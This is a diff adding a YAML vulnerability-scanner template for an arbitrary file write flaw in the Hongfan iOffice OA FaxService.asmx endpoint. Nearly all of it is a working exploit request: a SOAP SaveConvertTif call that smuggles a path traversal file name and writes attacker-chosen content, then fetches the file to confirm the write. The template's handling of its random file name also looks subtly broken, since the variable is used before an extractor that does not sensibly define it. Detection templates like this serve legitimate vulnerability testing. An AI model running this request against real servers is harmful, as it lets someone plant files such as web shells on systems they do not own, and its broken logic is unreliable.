@@ -1,0 +1,57 @@
+id: poc-ioffice-faxservice-upload
+info:
+  name: 红帆OA FaxService.asmx 任意文件写入漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: 任意写入
+  metadata:
+    finger: iOffice
+  description: |
+    This template exploits an arbitrary file write vulnerability in 红帆OA FaxService.asmx.
+http:
+  - raw:
+      - |
+        POST /iOffice/prg/set/wss/FaxService.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "http://tempuri.org/SaveConvertTif"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+        <soap:Body>
+        <SaveConvertTif xmlns="http://tempuri.org/">
+        <FaxID>1</FaxID>
+        <Pages>2</Pages>
+        <FileName>../../../../{{random_filename}}.txt</FileName>
+        <FileContent>dGVzdDEyMw==</FileContent>
+        </SaveConvertTif>
+        </soap:Body>
+        </soap:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "SaveConvertTifResponse"
+        part: body
+    extractors:
+      - type: regex
+        internal: true
+        name: random_filename
+        regex:
+          - "{{to_lower(rand_base(10))}}"
+  - raw:
+      - |
+        GET /iOffice/{{random_filename}}.txt HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "test123"
+        part: body
